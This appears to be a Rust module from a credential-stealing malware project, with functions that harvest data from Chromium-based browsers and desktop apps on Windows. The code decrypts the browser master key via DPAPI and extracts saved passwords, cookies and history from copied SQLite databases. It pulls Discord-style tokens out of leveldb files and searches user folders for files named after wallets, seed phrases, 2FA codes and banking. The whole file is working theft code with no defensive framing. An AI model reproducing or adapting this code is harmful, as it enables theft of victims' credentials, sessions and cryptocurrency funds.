use std::collections::{HashSet, HashMap};
use std::path::{PathBuf, Path};
use std::fs;
use regex::Regex;
use walkdir::{DirEntry, WalkDir};
use std::sync::{Arc, Mutex};
use std::thread::{self, JoinHandle};
use std::fs::File;
use std::io::{Read, BufReader};
use serde_json::Value;
use base64::{Engine as _, engine::general_purpose};
use rusqlite::{Connection, params};

use super::decrypt::{decrypt_value, crypt_unprotect_data};
use super::paths::{get_browser_paths, get_desktop_paths, get_files_paths};


fn should_skip(entry: &DirEntry, folders_to_skip: &HashSet<String>) -> bool {
    entry.file_type().is_dir() && folders_to_skip.contains(entry.file_name().to_str().unwrap())
}

fn should_collect(entry: &DirEntry, extensions: &HashSet<String>, keywords: &[String]) -> bool {
    if entry.file_type().is_file() {
        let ext = entry.path().extension().and_then(|s| s.to_str()).unwrap_or("");
        if extensions.contains(ext) {
            let file_name = entry.file_name().to_str().unwrap_or("");
            return keywords.iter().any(|keyword| file_name.contains(keyword));
        }
    }

    false
}

fn find_files_thread(path: &str, folders_to_skip: Arc<HashSet<String>>, extensions: Arc<HashSet<String>>, keywords: Arc<Vec<String>>, files: Arc<Mutex<Vec<String>>>) {
    let walker = WalkDir::new(path).into_iter();
    for entry in walker {
        match entry {
            Ok(entry) => {
                if should_skip(&entry, &folders_to_skip) {
                    continue;
                }

                if should_collect(&entry, &extensions, &keywords) {
                    let mut files = files.lock().unwrap();
                    files.push(entry.path().to_string_lossy().to_string());
                }
            }
            Err(e) => {
                if cfg!(debug_assertions) {
                    println!("(finder.rs:find_files_thread) Error processing entry: {}", e);
                }

                continue;
            }
        }
    }
}

fn get_master_key(path: &str) -> Vec<u8> {
    let mut data = Vec::new();

    let file = match File::open(path) {
        Ok(file) => file,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:get_master_key) Error opening file: {}", e);
            }   

            return data;
        }
    };

    let mut reader = BufReader::new(file);
    match reader.read_to_end(&mut data) {
        Ok(_) => (),
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:get_master_key) Error reading file: {}", e);
            }

            return data;
        }
    }

    let local_state: Value = match serde_json::from_slice(&data) {
        Ok(local_state) => local_state,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:get_master_key) Failed to convert to json: {}", e);
            }

            return data;
        }
    };

    let encrypted_key = match local_state["os_crypt"]["encrypted_key"].as_str() {
        Some(encrypted_key) => encrypted_key,
        None => {
            return data;
        }
    };

    let mut master_key = match general_purpose::STANDARD.decode(encrypted_key) {
        Ok(master_key) => master_key,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:get_master_key) Failed to decode base64: {}", e)
            }

            return data;
        }
    };

    master_key = master_key[5..].to_vec();

    crypt_unprotect_data(&master_key)

}

fn read_file_lossy(file_path: PathBuf) -> Result<String, String> {
    match fs::read(file_path) {
        Ok(cnt) => {
            let content = String::from_utf8_lossy(&cnt).to_string();
            Ok(content)
        }
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:read_file_lossy) Error reading file: {}", e);
            }
            
            Err("".to_string())
        }
    }
}

fn find_tokens_thread(path: &str, is_desktop: bool, tokens: &Arc<std::sync::Mutex<Vec<String>>>) {
    let mut master_key = Vec::new();
    let path_buf = PathBuf::from(path);

    if is_desktop {
        master_key = get_master_key(path_buf.join("Local State").to_str().unwrap());
    }

    let db_path = path_buf.join("Local Storage/leveldb");
    let files = match fs::read_dir(&db_path) {
        Ok(files) => files,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_tokens_thread) Error reading directory: {}", e);
            }
            return;
        }
    };

    let regex_desktop = Regex::new(r#"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"#).unwrap();
    let regex_browser = Regex::new(r#"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"#).unwrap();

    for file in files {
        let file = match file {
            Ok(file) => file,
            Err(e) => {
                if cfg!(debug_assertions) {
                    println!("(finder.rs:find_tokens_thread) Error processing file: {}", e);
                }
                continue;
            }
        };

        let file_path = file.path();
        let file_name = match file.file_name().into_string() {
            Ok(name) => name,
            Err(_) => {
                if cfg!(debug_assertions) {
                    println!("(finder.rs:find_tokens_thread) Error getting file name");
                }
                continue;
            }
        };

        if !file_name.ends_with(".log") && !file_name.ends_with(".ldb") {
            continue;
        }

        let content = match read_file_lossy(file_path) {
            Ok(content) => content,
            Err(e) => {
                if cfg!(debug_assertions) {
                    println!("(finder.rs:find_tokens_thread) Error reading file: {}", e);
                }
                continue;
            }
        };

        let tokens_found = if is_desktop {
            regex_desktop.find_iter(&content).collect::<Vec<_>>()
        } else {
            regex_browser.find_iter(&content).collect::<Vec<_>>()
        };

        for token_match in tokens_found {
            if is_desktop {
                let token_encoded = token_match.as_str().split("dQw4w9WgXcQ:").nth(1).unwrap();
                let token_decoded = match general_purpose::STANDARD.decode(token_encoded) {
                    Ok(token_decoded) => token_decoded,
                    Err(e) => {
                        if cfg!(debug_assertions) {
                            println!("(finder.rs:find_tokens_thread) Failed to decode base64: {}", e)
                        }

                        continue;
                    }
                };
                
                match decrypt_value(&token_decoded, &master_key) {
                    Ok(token) => {
                        let token_str = match String::from_utf8(token) {
                            Ok(token_str) => token_str,
                            Err(e) => {
                                if cfg!(debug_assertions) {
                                    println!("(finder.rs:find_passwords_thread) Failed to decode decrypted value to utf8: {}", e)
                                }

                                continue;
                            }
                        };

                        tokens.lock().unwrap().push(token_str);
                    },
                    Err(e) => {
                        if cfg!(debug_assertions) {
                            println!("(finder.rs:find_passwords_thread) Failed to decrypt value: {}", e)
                        }
    
                        return;
                    },
                };
            } else {
                let token = token_match.as_str();
                tokens.lock().unwrap().push(token.to_string());
            }
        }
        
    }
}

fn copy_file(src: &str, dst: &str) {
    match fs::copy(src, dst) {
        Ok(_) => return,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:copy_file) Failed to copy file: {}", e)
            }

            return;
        }
    }
}

fn find_passwords_thread(path: &str, has_profile: bool, passwords: &Arc<Mutex<Vec<HashMap<String, String>>>>) {
    let path_buf = PathBuf::from(path);

    let mut parent_dir = path_buf.clone();
    if has_profile {
        parent_dir = match path_buf.parent() {
            Some(parent) => parent.to_path_buf(),
            None => return
        };
    }

    let master_key = get_master_key(parent_dir.join("Local State").to_str().unwrap());

    let login_data_path = path_buf.to_str().unwrap().to_owned() + "\\Login Data";
    let backup_path = login_data_path.to_owned() + ".backup";
    copy_file(&login_data_path, &backup_path);

    let conn = match Connection::open(&backup_path) {
        Ok(conn) => conn,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_passwords_thread) Failed to open database: {}", e)
            }

            return;
        },
    };

    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
        Ok(stmt) => stmt,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_passwords_thread) Failed to fetch data from database: {}", e)
            }

            return;
        },
    };

    let rows = match stmt.query_map(params![], |row| {
        Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))
    }) {
        Ok(rows) => rows,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_passwords_thread) Failed to fetch rows from database: {}", e)
            }

            return;
        },
    };
    
    for row in rows {
        if let Ok((url, login, encrypted_password)) = row {
            if url.is_empty() || login.is_empty() || encrypted_password.is_empty() {
                continue;
            }

            match decrypt_value(&encrypted_password, &master_key) {
                Ok(decrypted_password) => {
                    let mut passwords = passwords.lock().unwrap();
                    let decrypted_password_str = match String::from_utf8(decrypted_password) {
                        Ok(decrypted_password_str) => decrypted_password_str,
                        Err(e) => {
                            if cfg!(debug_assertions) {
                                println!("(finder.rs:find_passwords_thread) Failed to decode decrypted value to utf8: {}", e)
                            }

                            continue;
                        }
                    };

                    passwords.push(HashMap::from([
                        ("url".to_string(), url),
                        ("login".to_string(), login),
                        ("password".to_string(), decrypted_password_str),
                    ]));
                }
                Err(e) => {
                    if cfg!(debug_assertions) {
                        println!("(finder.rs:find_passwords_thread) Failed to decrypt value: {}", e)
                    }

                    continue;
                },
            }
        }
    }
}

fn find_history_thread(path: &str, history: &Arc<Mutex<Vec<HashMap<String, String>>>>) {
    let path_buf = PathBuf::from(path);

    let cookie_data_path = path_buf.to_str().unwrap().to_owned() + "\\History";
    let backup_path = cookie_data_path.to_owned() + ".backup";
    copy_file(&cookie_data_path, &backup_path);

    let conn = match Connection::open(&backup_path) {
        Ok(conn) => conn,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_history_thread) Failed to open database: {}", e)
            }

            return;
        },
    };

    let mut stmt = match conn.prepare("SELECT url, title FROM urls") {
        Ok(stmt) => stmt,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_history_thread) Failed to fetch data from database: {}", e)
            }

            return;
        },
    };

    let rows = match stmt.query_map(params![], |row| {
        Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
    }) {
        Ok(rows) => rows,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_history_thread) Failed to fetch rows from database: {}", e)
            }

            return;
        },
    };

    for row in rows {
        if let Ok((url, title)) = row {
            if url.is_empty() || title.is_empty()  {
                continue;
            }

            let mut history = history.lock().unwrap();
            history.push(HashMap::from([
                ("url".to_string(), url),
                ("title".to_string(), title),
            ]))
        }
    }
}

fn find_cookies_thread(path: &str, has_profile: bool, cookies: &Arc<Mutex<Vec<HashMap<String, String>>>>) {
    let path_buf = PathBuf::from(path);

    let mut parent_dir = path_buf.clone();
    if has_profile {
        parent_dir = match path_buf.parent() {
            Some(parent) => parent.to_path_buf(),
            None => return
        };
    }

    let master_key = get_master_key(parent_dir.join("Local State").to_str().unwrap());
    
    let cookie_data_path = path_buf.to_str().unwrap().to_owned() + "\\Network\\Cookies";
    let backup_path = cookie_data_path.to_owned() + ".backup";
    copy_file(&cookie_data_path, &backup_path);

    let conn = match Connection::open(&backup_path) {
        Ok(conn) => conn,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_cookies_thread) Failed to open database: {}", e)
            }

            return;
        },
    };

    let mut stmt = match conn.prepare("SELECT host_key, name, path, encrypted_value FROM cookies") {
        Ok(stmt) => stmt,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_cookies_thread) Failed to fetch data from database: {}", e)
            }

            return;
        },
    };

    let rows = match stmt.query_map(params![], |row| {
        Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?,  row.get::<_, Vec<u8>>(3)?))
    }) {
        Ok(rows) => rows,
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(finder.rs:find_cookies_thread) Failed to fetch rows from database: {}", e)
            }

            return;
        },
    };

    for row in rows {
        if let Ok((host_key, name, path, encrypted_value)) = row {
            if host_key.is_empty() || name.is_empty() || path.is_empty() || encrypted_value.is_empty()  {
                continue;
            }

            match decrypt_value(&encrypted_value, &master_key) {
                Ok(decrypted_cookie) => {
                    let mut cookies = cookies.lock().unwrap();
                    let decrypted_cookie_str = match String::from_utf8(decrypted_cookie) {
                        Ok(decrypted_cookie_str) => decrypted_cookie_str,
                        Err(e) => {
                            if cfg!(debug_assertions) {
                                println!("(finder.rs:find_cookies_thread) Failed to decode decrypted value to utf8: {}", e)
                            }

                            continue;
                        }
                    };

                    cookies.push(HashMap::from([
                        ("host_key".to_string(), host_key),
                        ("name".to_string(), name),
                        ("value".to_string(), decrypted_cookie_str),
                    ]));
                }
                Err(e) => {
                    if cfg!(debug_assertions) {
                        println!("(finder.rs:find_cookies_thread) Failed to decrypt value: {}", e)
                    }

                    continue;
                },
            }
        }
    }
}


pub fn find_files() -> Vec<String> {
    let folders_path = get_files_paths();

    let folders_to_skip: HashSet<String> = vec![
        "node_modules", ".git", "bin", "obj", "dist", ".idea", ".vscode", "__pycache__", "build", ".DS_Store", "logs",
    ].into_iter().map(String::from).collect();

    let keywords: Vec<String> = vec![
        "secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "acc", "login",
        "bot", "atomic", "acount", "paypal", "banque", "metamask", "crypto", "exodus", "discord", "2fa", "code",
        "memo", "token", "seed", "mnemonic", "memoric", "private", "passphrase", "pass", "phrase", "steal", "bank",
        "info", "casino", "prv", "telegram", "identifiant", "identifiants", "personal", "trading", "bitcoin", "funds",
        "recup", "note",
    ].into_iter().map(String::from).collect();

    let extensions: HashSet<String> = vec![
        "rdp", "txt", "doc", "docx", "pdf", "csv", "xls", "xlsx", "keys", "ldb", "log",
    ].into_iter().map(String::from).collect();

    let files = Arc::new(Mutex::new(Vec::new()));
    let folders_to_skip = Arc::new(folders_to_skip);
    let extensions = Arc::new(extensions);
    let keywords = Arc::new(keywords);

    let mut handles: Vec<JoinHandle<()>> = vec![];

    for path in folders_path {
        let files_clone = Arc::clone(&files);
        let folders_to_skip_clone = Arc::clone(&folders_to_skip);
        let extensions_clone = Arc::clone(&extensions);
        let keywords_clone = Arc::clone(&keywords);

        let handle = thread::spawn(move || {
            find_files_thread(&path, folders_to_skip_clone, extensions_clone, keywords_clone, files_clone);
        });

        handles.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }

    let files = files.lock().unwrap();
    files.to_vec()

}

pub fn find_tokens() -> Vec<String> {
    let browser_paths = get_browser_paths();
    let desktop_paths = get_desktop_paths();

    let mut handles: Vec<JoinHandle<()>> = vec![];
    let tokens = Arc::new(std::sync::Mutex::new(Vec::new()));
    for path in browser_paths {
        if Path::new(&path).exists() {
            let tokens_clone = Arc::clone(&tokens);
            let app_path_clone = path.clone();
            let handle = thread::spawn(move || {
                find_tokens_thread(&app_path_clone, false, &tokens_clone);
            });

            handles.push(handle);
        }
    }

    for path in desktop_paths {
        if Path::new(&path).exists() {
            let tokens_clone = Arc::clone(&tokens);
            let app_path_clone = path.clone();
            let handle = thread::spawn(move || {
                find_tokens_thread(&app_path_clone, true, &tokens_clone);
            });

            handles.push(handle);
        }
    }

    for handle in handles {
        handle.join().unwrap();
    }

    let tokens = tokens.lock().unwrap();
    tokens.to_vec()

}

pub fn find_passwords() -> Vec<HashMap<std::string::String, std::string::String>> {
    let browser_paths = get_browser_paths();

    let mut handles: Vec<JoinHandle<()>> = vec![];

    let data: Vec<HashMap<String, String>> = Vec::new();
    let passwords = Arc::new(std::sync::Mutex::new(data));
    
    for path in browser_paths {
        let path_buf = Path::new(&path);
        if path_buf.exists() {
            let passwords_clone = Arc::clone(&passwords);
            let app_path_clone = path.clone();

            let profile = path_buf.file_name().expect("");
            let has_profile = vec!["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"].iter().any(|&prof| prof == profile);
            let handle = thread::spawn(move || {
                find_passwords_thread(&app_path_clone, has_profile, &passwords_clone);
            });

            handles.push(handle);
        }
    }

    for handle in handles {
        handle.join().unwrap();
    }

    let passwords = passwords.lock().unwrap();
    passwords.to_vec()
}

pub fn find_cookies() -> Vec<HashMap<std::string::String, std::string::String>> {
    let browser_paths = get_browser_paths();

    let mut handles: Vec<JoinHandle<()>> = vec![];

    let data: Vec<HashMap<String, String>> = Vec::new();
    let cookies = Arc::new(std::sync::Mutex::new(data));
    
    for path in browser_paths {
        let path_buf = Path::new(&path);
        if path_buf.exists() {
            let cookies_clone = Arc::clone(&cookies);
            let app_path_clone = path.clone();
            
            let profile = path_buf.file_name().expect("");
            let has_profile = vec!["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"].iter().any(|&prof| prof == profile);
            let handle = thread::spawn(move || {
                find_cookies_thread(&app_path_clone, has_profile, &cookies_clone);
            });

            handles.push(handle);
        }
    }

    for handle in handles {
        handle.join().unwrap();
    }

    let cookies = cookies.lock().unwrap();
    cookies.to_vec()
}

pub fn find_history() -> Vec<HashMap<std::string::String, std::string::String>> {
    let browser_paths = get_browser_paths();

    let mut handles: Vec<JoinHandle<()>> = vec![];

    let data: Vec<HashMap<String, String>> = Vec::new();
    let history = Arc::new(std::sync::Mutex::new(data));
    
    for path in browser_paths {
        let path_buf = Path::new(&path);
        if path_buf.exists() {
            let history_clone = Arc::clone(&history);
            let app_path_clone = path.clone();
            
            let handle = thread::spawn(move || {
                find_history_thread(&app_path_clone, &history_clone);
            });

            handles.push(handle);
        }
    }

    for handle in handles {
        handle.join().unwrap();
    }

    let history = history.lock().unwrap();
    history.to_vec()
}